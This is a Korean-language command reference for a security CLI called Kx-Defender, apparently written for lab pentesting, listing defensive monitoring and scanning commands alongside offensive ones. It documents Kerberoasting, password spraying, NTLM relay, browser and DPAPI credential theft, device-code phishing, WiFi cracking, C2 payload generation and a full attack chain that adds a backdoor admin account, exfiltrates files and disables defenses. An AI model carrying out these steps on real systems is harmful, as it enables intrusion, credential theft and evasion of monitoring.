# Kx-Defender 완전 명령어 가이드

**Kx-Defender만의 전용 CLI 명령어 시스템**

---

## 명령어 체계 (Command Hierarchy)

```
kx <VERB> <OBJECT> [--flags]

VERB:     작업 종류 (Action - 14개 카테고리)
OBJECT:   대상 (Target)
FLAGS:    매개변수 (--scope, --sim, --live, --with, etc.)
```

---

## 1. 🛡️ 방어 (Defense) 명령어

### 1.1 프로세스 감시 (watch)

```bash
# 실시간 프로세스 모니터링
kx watch procs --scope lab --live
  ├── --name <pattern>       # 프로세스명 필터
  ├── --pid <pid>            # 특정 PID 추적
  ├── --parent <ppid>        # 부모 프로세스 필터
  ├── --min-memory <mb>      # 메모리 최소값 필터
  ├── --min-cpu <percent>    # CPU 사용률 필터
  └── --interval <sec>       # 갱신 간격 (기본: 1초)

# 결과: 프로세스 트리, 행동 분석 점수, 위험도 표시

# 예제
kx watch procs --scope lab --live --name powershell --interval 2 --sim
```

### 1.2 프로세스 차단 (kill)

```bash
# 프로세스 즉시 종료
kx kill pid --scope lab --pid <pid> [--force] [--tree]
  ├── --pid <pid>            # 종료할 프로세스 ID
  ├── --force                # 강제 종료
  ├── --tree                 # 자식 프로세스도 함께 종료
  ├── --reason <text>        # 종료 사유 기록
  └── --whitelist <pid>      # 제외할 PID

# 상위 프로세스명으로 종료
kx kill proc --scope lab --name <pattern> [--tree]
  └── --partial              # 부분 일치 허용

# 결과: 종료 성공/실패, 차단 규칙 저장

# 예제
kx kill pid --scope lab --pid 4242 --force --tree --reason "Suspected malware" --sim
```

### 1.3 악성코드 스캔 (sig)

```bash
# YARA 시그니처로 스캔
kx sig scan --scope lab --path <path> [--recursive]
  ├── --path <path>          # 대상 경로 (파일/폴더)
  ├── --recursive             # 재귀적 스캔
  ├── --severity <level>     # 심각도 필터 (critical|high|medium|low)
  ├── --rule <pattern>       # 특정 규칙만
  ├── --exclude <pattern>    # 제외 패턴
  └── --max-size <mb>        # 최대 파일 크기

# 프로세스 메모리 스캔
kx sig scan-mem --scope lab --pid <pid>
  ├── --pid <pid>            # 대상 프로세스
  ├── --offset <addr>        # 시작 주소
  └── --size <bytes>         # 스캔 크기

# 결과: 탐지된 악성코드, 파일 경로, 오프셋

# 예제
kx sig scan --scope lab --path "C:\\Windows\\Temp" --recursive --severity critical,high --sim
```

### 1.4 행동 분석 (trace)

```bash
# 프로세스 행동 추적
kx trace behavior --scope lab --pid <pid> [--duration <sec>]
  ├── --pid <pid>            # 대상 프로세스
  ├── --duration <sec>       # 추적 시간 (기본: 60초)
  ├── --events <type>        # 이벤트 필터 (api|network|file|registry|dll)
  ├── --log <format>         # 로그 형식 (json|csv|text)
  └── --export <file>        # 내보내기

# 비정상 행동 감지
kx trace anomaly --scope lab --pid <pid>
  ├── --baseline <file>      # 정상 동작 기준선
  ├── --sensitivity <0-100>  # 민감도 (기본: 80)
  └── --threshold <score>    # 경고 임계값 (기본: 70)

# 결과: 행동 타임라인, 의심 활동, 점수

# 예제
kx trace behavior --scope lab --pid 1234 --duration 120 --events api,network --live
```

### 1.5 규칙 관리 (audit)

```bash
# 탐지 규칙 목록
kx audit rules --scope lab --list
  ├── --category <cat>       # 카테고리 필터 (yara|behavior|network)
  ├── --enabled-only         # 활성 규칙만
  └── --export <file>        # 내보내기

# 규칙 활성화/비활성화
kx audit rules --scope lab --enable <rule_id>
kx audit rules --scope lab --disable <rule_id>

# 커스텀 규칙 추가
kx audit rules --scope lab --add --file <path> [--test]
  ├── --file <path>          # 규칙 파일 (YARA, JSON)
  ├── --test                 # 검증만 하고 추가하지 않음
  └── --category <cat>       # 카테고리 분류

# 규칙 동기화
kx audit rules --scope lab --sync [--source <url>]
  └── --source <url>         # 원격 규칙 저장소

# 예제
kx audit rules --scope lab --list --category yara --enabled-only --sim
```

---

## 2. ⚔️ 공격 (Attack) 명령어

### 2.1 Active Directory 공격 (roast)

```bash
# Kerberoasting (SPN 열거 & TGS 추출)
kx roast tickets --scope lab --realm <domain>
  ├── --realm <domain>       # 대상 도메인 (lab.local)
  ├── --user <username>      # 열거 사용자 (기본: 현재 사용자)
  ├── --spn <pattern>        # 특정 SPN만
  ├── --etype <type>         # 암호화 타입 필터 (23|17|18)
  ├── --output <format>      # 출력 형식 (hashcat|john|json)
  └── --wordlist <file>      # 크래킹 사전 (선택)

# LDAP 정보 수집
kx roast ldap --scope lab --realm <domain>
  ├── --enumerate <type>     # 열거 대상 (users|groups|spns|domain|trusts)
  ├── --filter <ldap>        # LDAP 필터
  └── --export <file>        # 결과 저장

# 비밀번호 스프레이 (Password Spray)
kx roast spray --scope lab --realm <domain> --wordlist <file>
  ├── --realm <domain>
  ├── --wordlist <file>      # 비밀번호 사전
  ├── --users <file>         # 사용자 목록
  ├── --delay <ms>           # 요청 간 지연 (기본: 100ms)
  ├── --threshold <count>    # 중단 임계값
  └── --exclude <user>       # 제외 사용자

# 결과: 열거된 계정, 해시, 성공한 자격증명

# 예제
kx roast tickets --scope lab --realm lab.local --output hashcat --sim
```

### 2.2 NTLM Relaying (relay)

```bash
# NTLM 캡처 & 중계 (ADCS ESC8)
kx relay ntlm --scope lab --target <adcs> [--listener <type>]
  ├── --target <adcs>        # 대상 ADCS 서버
  ├── --listener <type>      # 리스너 (smb|http|https)
  ├── --port <port>          # 리스닝 포트
  ├── --signing              # 메시지 서명 체크
  └── --dump-credentials     # 캡처된 자격증명 표시

# 인증서 요청
kx relay cert --scope lab --ca <ca> --username <user>
  ├── --ca <ca>              # 대상 CA 서버
  ├── --username <user>      # 가장할 사용자
  ├── --template <tpl>       # 인증서 템플릿
  └── --export <file>        # 인증서 저장

# 결과: 캡처된 NTLM, 발급된 인증서, Domain Admin 권한

# 예제
kx relay ntlm --scope lab --target dc.lab.local --listener smb --sim
```

### 2.3 DPAPI 악용 (loot)

```bash
# 저장된 자격증명 탈취
kx loot credentials --scope lab [--user <username>]
  ├── --user <username>      # 특정 사용자 (기본: 현재)
  ├── --type <type>          # 타입 필터 (chrome|edge|firefox|wifi|rdp)
  ├── --decrypt              # 자동 복호화
  └── --export <file>        # JSON으로 내보내기

# 브라우저 비밀번호
kx loot browser --scope lab [--browser <name>]
  ├── --browser <name>       # 브라우저 (chrome|edge|firefox)
  └── --all                  # 모든 브라우저

# WiFi 프로필
kx loot wifi --scope lab [--ssid <name>]
  ├── --ssid <name>          # 특정 SSID
  └── --include-hidden       # 숨겨진 네트워크도

# RDP 캐시
kx loot rdp --scope lab
  └── --raw                  # Raw 바이너리 데이터

# 결과: 탈취한 비밀번호, 토큰, 프로필 정보

# 예제
kx loot credentials --scope lab --type chrome,wifi --decrypt --sim
```

### 2.4 OAuth & Identity 공격 (bait)

```bash
# Device Code Flow 피싱
kx bait device-code --scope lab --tenant <id> [--app <client_id>]
  ├── --tenant <id>          # Azure Tenant ID
  ├── --app <client_id>      # Application ID (기본: 샘플)
  ├── --scope <scope>        # OAuth Scope (.default|Mail.Read|etc)
  ├── --generate-link        # 피싱 링크 생성
  └── --poll-timeout <sec>   # 토큰 폴링 타임아웃

# Entra ID 정보 수집
kx bait aad --scope lab --tenant <id>
  ├── --tenant <id>
  ├── --enumerate <type>     # 열거 (users|groups|apps|roles)
  ├── --public               # 공개 정보만
  └── --export <file>        # 결과 저장

# 조건부 접근(Conditional Access) 테스트
kx bait ca-test --scope lab --url <target> --user <email>
  ├── --url <target>         # 대상 URL
  ├── --user <email>         # 테스트 사용자
  └── --method <method>      # 인증 방법 (pass|mfa|device)

# 결과: 피싱 URL, 획득한 토큰, 액세스 가능 리소스

# 예제
kx bait device-code --scope lab --tenant xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx --generate-link --sim
```

### 2.5 WiFi 공격 (crack)

```bash
# WiFi 네트워크 스캔
kx crack wifi --scope lab --scan
  ├── --interface <iface>    # 무선 인터페이스
  ├── --channel <ch>         # 특정 채널 (1-13)
  ├── --filter <ssid>        # SSID 필터
  └── --export <file>        # JSON 저장

# 핸드셰이크 캡처
kx crack handshake --scope lab --ssid <name> [--duration <sec>]
  ├── --ssid <name>
  ├── --bssid <mac>          # BSSID (선택)
  ├── --duration <sec>       # 캡처 시간
  └── --output <file>        # 캡 파일 저장

# 비밀번호 크래킹
kx crack password --scope lab --capture <file> --wordlist <dict>
  ├── --capture <file>       # 핸드셰이크 파일
  ├── --wordlist <dict>      # 사전 파일
  ├── --rules <file>         # 규칙 파일 (Hashcat)
  ├── --gpu                  # GPU 가속
  ├── --threads <n>          # 스레드 수
  └── --max-time <sec>       # 최대 실행 시간

# WPS 테스트
kx crack wps --scope lab --ssid <name> [--pin <pin>]
  ├── --ssid <name>
  ├── --pin <pin>            # 특정 PIN 시도
  └── --brute-force          # 완전 브루트포스

# 결과: 발견된 네트워크, 핸드셰이크, 크래킹된 비밀번호

# 예제
kx crack password --scope lab --capture handshake.cap --wordlist dict.txt --gpu --sim
```

---

## 3. 🌐 웹 보안 (Web) 명령어

### 3.1 웹 취약점 스캔 (sweep)

```bash
# 동적 웹 취약점 스캔
kx sweep web --scope owned --url <target> [--depth <n>]
  ├── --url <target>         # 대상 URL
  ├── --depth <n>            # 크롤링 깊이 (기본: 3)
  ├── --scope <domain>       # 크롤 범위 (도메인)
  ├── --crawl-only           # 크롤링만 (스캔 안함)
  ├── --headless             # JavaScript 렌더링
  ├── --auth <credentials>   # 인증 (user:pass)
  ├── --cookies <file>       # 쿠키 파일
  ├── --ua <agent>           # User-Agent
  ├── --proxy <url>          # 프록시
  └── --timeout <sec>        # 타임아웃

# SQLi 테스트
kx sweep sqli --scope owned --url <target> [--level <1-5>]
  ├── --url <target>
  ├── --parameter <name>     # 특정 매개변수만
  ├── --level <1-5>          # 테스트 수준 (1=빠름, 5=완전)
  ├── --risk <1-3>           # 위험도
  └── --delay <ms>           # 요청 지연

# XSS 테스트
kx sweep xss --scope owned --url <target>
  ├── --url <target>
  ├── --type <type>          # 유형 (reflected|stored|dom)
  ├── --encode <type>        # 인코딩 우회
  └── --blind               # Blind XSS 탐지

# CSRF 테스트
kx sweep csrf --scope owned --url <target>
  ├── --url <target>
  └── --check-patterns      # 일반적인 패턴 검사

# 기타 취약점
kx sweep owasp --scope owned --url <target> [--top10]
  ├── --url <target>
  ├── --top10               # OWASP Top 10만
  ├── --include <vuln>      # 포함할 취약점
  └── --exclude <vuln>      # 제외할 취약점

# 결과: 발견된 취약점, PoC, 수정 권장사항, HTML 리포트

# 예제
kx sweep web --scope owned --url https://target.com --depth 4 --headless --timeout 30 --sim
```

### 3.2 API 보안 (probe)

```bash
# REST API 테스트
kx probe api --scope owned --url <api_base>
  ├── --url <api_base>       # API 베이스 URL
  ├── --spec <file>          # OpenAPI/Swagger 스펙
  ├── --endpoints <file>     # 엔드포인트 목록
  ├── --auth <token>         # Bearer 토큰
  └── --test-auth            # 인증 우회 테스트

# GraphQL 테스트
kx probe graphql --scope owned --url <endpoint>
  ├── --url <endpoint>
  ├── --introspect           # 스키마 추출
  ├── --enumerate            # 필드 열거
  └── --inject <payload>     # 쿼리 인젝션

# 결과: API 엔드포인트, 취약점, 인증 문제

# 예제
kx probe api --scope owned --url https://api.target.com --spec openapi.json --sim
```

---

## 4. 🎯 C2 & 포스트 익스플로잇 (nexus)

### 4.1 C2 리스너 (nexus listen)

```bash
# C2 리스너 시작
kx nexus listen --scope lab --bind <host:port> [--protocol <type>]
  ├── --bind <host:port>     # 리스닝 주소
  ├── --protocol <type>      # HTTP|HTTPS|DNS|SMB|TCP (기본: HTTP)
  ├── --cert <file>          # SSL 인증서
  ├── --key <file>           # SSL 키
  ├── --domain <domain>      # 도메인 (DNS 스푸핑)
  ├── --key-exchange <type>  # 키 교환 (RSA|ECDH)
  ├── --encoding <type>      # 인코딩 (base64|xor|raw)
  └── --jitter <percent>     # 비콘 지터 (0-100%)

# Havoc/Sliver 호환 모드
kx nexus havoc --scope lab --bind <host:port>
kx nexus sliver --scope lab --bind <host:port>

# 결과: 리스너 ID, 상태, 포트

# 예제
kx nexus listen --scope lab --bind 127.0.0.1:4455 --protocol https --cert cert.pem --sim
```

### 4.2 에이전트 생성 (nexus forge)

```bash
# 페이로드 생성
kx nexus forge --scope lab --listener <id> --os <os> [--arch <arch>]
  ├── --listener <id>        # 대상 리스너
  ├── --os <os>              # windows|linux|macos
  ├── --arch <arch>          # x64|x86|arm64
  ├── --format <type>        # exe|dll|ps1|sh|elf|bin
  ├── --obfuscate            # 난독화
  ├── --injection <method>   # 인젝션 방식 (hollow|reflective)
  └── --export <file>        # 저장 경로

# 에이전트 옵션 구성
kx nexus config --scope lab --listener <id>
  ├── --sleep <sec>          # 슬립 시간
  ├── --jitter <percent>     # 지터
  ├── --timeout <sec>        # 타임아웃
  └── --clean-up             # 추적 제거

# 결과: 페이로드 경로, 해시, 크기

# 예제
kx nexus forge --scope lab --listener 1 --os windows --arch x64 --format exe --obfuscate --sim
```

### 4.3 세션 관리 (nexus session)

```bash
# 세션 목록
kx nexus session --scope lab --list
  ├── --status <status>      # active|idle|dead
  ├── --os <os>              # 운영체제 필터
  └── --last <minutes>       # 최근 N분 활동

# 세션 상세 정보
kx nexus session --scope lab --show <session_id>
  ├── --session_id <id>
  └── --history              # 명령 히스토리

# 세션 실행
kx nexus exec --scope lab --session <id> --cmd <command>
  ├── --session <id>
  ├── --cmd <command>        # 실행할 명령
  ├── --timeout <sec>        # 타임아웃
  └── --output <format>      # json|text|raw

# 파일 전송
kx nexus file --scope lab --session <id> --get <remote> --save <local>
kx nexus file --scope lab --session <id> --put <local> --to <remote>

# 권한 상승
kx nexus privesc --scope lab --session <id> [--method <type>]
  ├── --session <id>
  ├── --method <type>        # uac|token|kernel|cve
  └── --target <pid>         # 대상 PID

# 결과: 명령 실행 결과, 파일 내용, 권한 정보

# 예제
kx nexus exec --scope lab --session abc123 --cmd "whoami" --timeout 10 --sim
```

---

## 5. 🔍 분석 & 모니터링 (graph)

### 5.1 위협 그래프 (graph threat)

```bash
# 위협 관계도 생성
kx graph threat --scope lab [--focus <type>]
  ├── --focus <type>         # process|network|file|behavior
  ├── --depth <n>            # 관계도 깊이
  ├── --filter <expr>        # 필터 표현식
  └── --export <format>      # dot|json|html

# 프로세스 관계 추적
kx graph process --scope lab --pid <pid>
  ├── --pid <pid>
  ├── --show-parent          # 부모 프로세스
  ├── --show-children        # 자식 프로세스
  └── --show-network         # 네트워크 연결

# 네트워크 활동 분석
kx graph network --scope lab [--ip <address>]
  ├── --ip <address>         # 특정 IP만
  ├── --filter <expr>        # 포트/프로토콜 필터
  └── --geoip                # GeoIP 정보 추가

# 결과: SVG/HTML 그래프, 관계도, 분석 보고서

# 예제
kx graph threat --scope lab --focus behavior --depth 3 --export html --sim
```

### 5.2 검색 & 분석 (query)

```bash
# 이벤트 검색
kx query events --scope lab --type <type> [--since <time>]
  ├── --type <type>          # process|network|file|registry|api|behavior
  ├── --since <time>         # "1h", "30m", "2023-01-01"
  ├── --until <time>
  ├── --filter <expr>        # JSON 필터
  ├── --limit <n>            # 결과 개수
  └── --export <file>        # 내보내기

# 통계 분석
kx query stats --scope lab --metric <metric>
  ├── --metric <metric>      # events_per_hour|top_processes|network_ips
  └── --group-by <field>     # 그룹화 기준

# 지시자 검색 (IoC)
kx query ioc --scope lab --type <type> --value <value>
  ├── --type <type>          # ip|domain|hash|url|email
  ├── --value <value>
  └── --reputation           # 신뢰도 조회

# 결과: 매칭 이벤트, 통계, 위협 점수

# 예제
kx query events --scope lab --type behavior --since 1h --filter "score>70" --sim
```

---

## 6. ⚙️ 관리 (manage)

### 6.1 구성 & 정책 (config)

```bash
# 전역 설정
kx config get --scope lab [--key <key>]
  ├── --key <key>            # 특정 설정만
  └── --json                 # JSON 형식

kx config set --scope lab --key <key> --value <value>
  ├── --key <key>
  ├── --value <value>
  └── --overwrite            # 덮어쓰기

# 정책 관리
kx config policy --scope lab --create --file <file>
  ├── --file <file>          # 정책 파일
  └── --validate             # 검증만

kx config policy --scope lab --apply <policy_id>
  └── --policy_id <id>

# 프로필 관리
kx config profile --list
kx config profile --create --name <name> --scope <scope>
kx config profile --activate <profile_name>

# 예제
kx config set --scope lab --key log_level --value debug --sim
```

### 6.2 보고서 & 내보내기 (report)

```bash
# 분석 리포트
kx report generate --scope lab --type <type> [--output <file>]
  ├── --type <type>          # daily|weekly|threat|compliance
  ├── --output <file>        # HTML|PDF|JSON
  ├── --include <section>    # 포함할 섹션
  └── --period <range>       # "last_7d", "2023-01"

# 데이터 내보내기
kx report export --scope lab --type <type> --format <format> --to <file>
  ├── --type <type>          # events|detections|sessions
  ├── --format <format>      # csv|json|sqlite
  └── --to <file>

# 감사 로그
kx report audit --scope lab [--action <action>]
  ├── --action <action>      # 특정 작업 필터
  ├── --user <user>          # 사용자 필터
  └── --since <time>         # 시간 범위

# 예제
kx report generate --scope lab --type threat --output report.html --period last_7d --sim
```

### 6.3 배포 & 에이전트 관리 (deploy)

```bash
# 에이전트 배포
kx deploy agent --scope lab --payload <file> --target <host>
  ├── --payload <file>       # 에이전트 파일
  ├── --target <host>        # 대상 호스트
  ├── --method <method>      # psexec|wmi|ssh
  ├── --username <user>
  ├── --password <pass>
  └── --timeout <sec>

# 배포 현황
kx deploy status --scope lab
  └── --listener <id>        # 특정 리스너만

# 에이전트 업데이트
kx deploy update --scope lab --agents <filter> --payload <file>
  ├── --agents <filter>      # "all", "os:windows", "ip:192.168.*"
  └── --payload <file>

# 예제
kx deploy agent --scope lab --payload agent.exe --target 192.168.1.100 --method psexec --sim
```

---

## 7. 🛠️ 유틸리티 (util)

### 7.1 헬프 & 정보

```bash
# 도움말
kx help                      # 전체 도움말
kx help <verb>              # 특정 동사 도움말
kx help <verb> <object>     # 구체적 도움말

# 명령어 목록
kx lexicon                   # 전체 렉시콘
kx lexicon --verbs           # 동사만
kx lexicon --objects         # 객체만

# 버전 & 정보
kx version
kx info                      # 시스템 정보
kx status                    # 모든 리스너/세션 상태

# 예제
kx help roast tickets
```

### 7.2 테스트 & 검증 (verify)

```bash
# 명령어 검증
kx verify command "<full_command>"
  └── --dry-run              # 실제 실행 없이 검증

# 연결 테스트
kx verify connect --target <host> [--port <port>]
  ├── --target <host>
  └── --port <port>

# 권한 확인
kx verify access --scope lab
  └── --action <action>      # 특정 작업 권한 확인

# 예제
kx verify command "kx roast tickets --scope lab --realm lab.local" --dry-run
```

---

## 명령어 플래그 (Global Flags)

### 모든 명령어에서 사용 가능

```bash
--scope <scope>           ⭐ 필수 (lab|owned|pact|engagement)
--sim                     시뮬레이션 모드 (기본값)
--live                    실행 모드 (위험)
--json                    JSON 출력
--csv                     CSV 출력
--table                   표 형식 출력
--quiet                   최소 출력
--verbose                 상세 출력
--timeout <sec>           타임아웃
--retry <count>           재시도 횟수
--with <key=value>        커스텀 매개변수
--log <file>              로그 파일 저장
--profile <name>          프로필 사용
--no-color                색상 없음
```

---

## 사용 예제

### 침투 테스트 시나리오

```bash
# 1단계: 정찰 (Reconnaissance)
kx roast ldap --scope lab --realm lab.local --enumerate users --export users.txt
kx watch procs --scope lab --live --interval 5

# 2단계: 초기 접근 (Initial Access)
kx roast tickets --scope lab --realm lab.local --output hashcat
kx crack password --scope lab --capture handshake.cap --wordlist dict.txt --gpu

# 3단계: 권한 상승 (Privilege Escalation)
kx relay ntlm --scope lab --target dc.lab.local --listener smb
kx relay cert --scope lab --ca ca.lab.local --username admin

# 4단계: 지속성 확보 (Persistence)
kx nexus listen --scope lab --bind 127.0.0.1:4455 --protocol https
kx nexus forge --scope lab --listener 1 --os windows --arch x64 --format dll

# 5단계: 권한 축소 (Lateral Movement)
kx nexus exec --scope lab --session abc123 --cmd "net user admin pass123 /add"
kx nexus exec --scope lab --session abc123 --cmd "net localgroup administrators admin /add"

# 6단계: 데이터 수집 (Data Exfiltration)
kx nexus file --scope lab --session abc123 --get "C:\\Users\\Admin\\Documents\\secrets.txt" --save secrets.txt
kx loot credentials --scope lab --decrypt --export credentials.json

# 7단계: 모니터 우회 (Evasion & Defense Evasion)
kx audit rules --scope lab --disable event_tracing
kx kill pid --scope lab --name "defender" --force

# 최종: 분석 & 리포트
kx graph threat --scope lab --focus behavior --export html
kx report generate --scope lab --type threat --output report.html
```

---

## 명령어 실행 순서 가이드

| 단계 | 명령어 | 목적 |
|------|--------|------|
| 1️⃣ | `kx help` | 도움말 확인 |
| 2️⃣ | `kx lexicon` | 사용 가능한 명령어 확인 |
| 3️⃣ | `kx <cmd> --sim` | 시뮬레이션 테스트 |
| 4️⃣ | `kx <cmd> --live` | 실행 (--sim 제거 필수) |
| 5️⃣ | `kx report generate` | 결과 분석 |

---

**모든 명령어는 `--sim` (시뮬레이션) 모드에서 테스트 후 `--live` (실행) 모드 사용을 권장합니다.**

